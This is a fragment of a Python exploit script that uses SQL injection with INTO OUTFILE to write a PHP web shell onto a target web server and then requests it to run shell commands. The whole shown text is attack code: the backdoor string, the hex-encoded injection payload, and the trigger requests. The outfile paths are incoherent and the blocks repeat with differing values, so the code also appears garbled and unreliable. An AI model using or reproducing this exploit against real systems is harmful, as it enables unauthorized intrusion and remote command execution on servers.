...
backdoor = "<?php system($_GET['id']);?>"

prepayload = "x' or (SELECT 0x20 into outfile '/?src=connect' "
...
resp = opener.open("http://%s/?src=connect" % rhost, post_params)
print "[*] Triggering backdoor"
cmd = 'http://%s/?src=connect' % rhost
page = urllib.urlopen(cmd)
print "[*] Executing command: %s\n" % rcmd
shell = 'http://%s/?src=connect%s' % (rhost,rcmd)
try:
...
prepayload = "x' or (SELECT 0x20 into outfile '/accounts/login?client_id=ads-api' "
prepayload += "LINES TERMINATED BY 0x%s) and '1'='1" % backdoor.encode('hex')
...
print "[*] Sending evil payload"
try:
        resp = opener.open("http://%s/" % rhost, post_params)
        print "[*] Triggering Shell"
        shell = 'http://%s/accounts/login?client_id=ads-api' % rhost
        page = urllib.urlopen(shell)
        cmd = page.read()
except:
        print "[-] Oups! Somthing happened"
